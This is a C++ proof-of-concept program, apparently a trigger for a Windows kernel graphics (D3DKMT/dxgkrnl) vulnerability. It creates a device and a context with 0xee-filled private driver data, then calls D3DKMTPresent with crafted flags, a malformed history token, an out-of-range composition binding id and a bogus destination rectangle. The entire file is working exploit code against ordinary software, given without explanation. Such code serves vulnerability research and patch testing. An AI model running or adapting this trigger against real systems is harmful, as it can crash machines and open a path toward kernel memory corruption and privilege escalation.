// PoC.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <d3dkmthk.h>

int main()
{
	NTSTATUS status = 0;

	D3DKMT_CREATEDEVICE* deviceAry = NULL;
	deviceAry = new D3DKMT_CREATEDEVICE();

	memset(deviceAry, 0, sizeof(D3DKMT_CREATEDEVICE));

	D3DKMT_ENUMADAPTERS enumAdapter = { 0 };
	D3DKMTEnumAdapters(&enumAdapter);
	deviceAry->hAdapter = enumAdapter.Adapters[1].hAdapter; 

	status = D3DKMTCreateDevice(deviceAry);

	D3DKMT_CREATECONTEXT* Context = NULL;
	Context = new D3DKMT_CREATECONTEXT();

	Context->hDevice = deviceAry->hDevice;
	Context->PrivateDriverDataSize = 0x200; 
	char data3[0x200] = { 0 };
	memset(data3, 0xee, 0x200);
	*(DWORD*)(data3 + 0x8) = 1;

	Context->pPrivateDriverData = data3;

	Context->ClientHint = D3DKMT_CLIENTHINT_OPENGL;
	Context->Flags.InitialData = 1;

    status = D3DKMTCreateContext(Context);

	D3DKMT_PRESENT* present = NULL;
	present = new D3DKMT_PRESENT();

	present->Flags.Blt = 1;
	present->Flags.BltStereoUseRight = 1;
	present->Flags.DstColorKey = 1;
	present->Flags.PresentCountValid = 1;
	present->Flags.PresentDDA = 1;
    present->Flags.PresentHistoryTokenOnly = 1;
	present->Flags.Value = 0xb01c82;

	present->FlipInterval = D3DDDI_FLIPINTERVAL_IMMEDIATE;

	present->hContext= Context->hContext;
	present->hDevice= Context->hContext;

	present->hWindow = GetDesktopWindow(); 
	present->PresentHistoryToken.Model = D3DKMT_PM_REDIRECTED_COMPOSITION;//D3DKMT_PM_REDIRECTED_COMPOSITION; // ; D3DKMT_PM_SCREENCAPTUREFENCE//
	present->PresentHistoryToken.TokenSize = 0xAA;//****
	present->PresentHistoryToken.CompositionBindingId = 0xFFFF7EFEEFFFEEEE;//****

	present->DstRect.bottom = 0xfffffeff;
	present->DstRect.top = 0x0003e8;
	present->DstRect.left = 0;
	present->DstRect.right = 0x0000c8;

	present->PrivateDriverDataSize = 0xcc;
	char* PrivateData = NULL;
	PrivateData = new char[present->PrivateDriverDataSize];
	memset(PrivateData, 0x00, present->PrivateDriverDataSize);

	present->pPrivateDriverData = PrivateData;
	status = D3DKMTPresent(present);

	return 0;
}
